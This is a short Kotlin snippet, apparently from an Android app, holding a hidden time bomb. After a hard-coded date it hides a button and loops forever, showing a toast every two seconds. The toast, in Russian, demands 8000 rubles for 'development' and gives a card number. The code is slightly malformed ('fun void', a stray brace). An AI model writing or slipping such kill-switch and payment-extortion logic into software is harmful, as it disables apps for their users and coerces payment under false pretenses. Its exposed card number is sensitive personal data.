fun void initDestructor() {

        if (destruction()) {
            fab.visibility = View.INVISIBLE
            launch(UI) {
                while (true) {
                    delay(2000)
                    showToast("Оплатите разработку, чтобы продолжить пользоваться приложением.\n\n" +
                            "Номер карты: 4276380027383004\nСумма: 8000р")
                }
                }
        }
    }

    val limit = 1505174400000
    fun destruction(): Boolean {
        if (System.currentTimeMillis() > limit)
            return true
        return false
    }

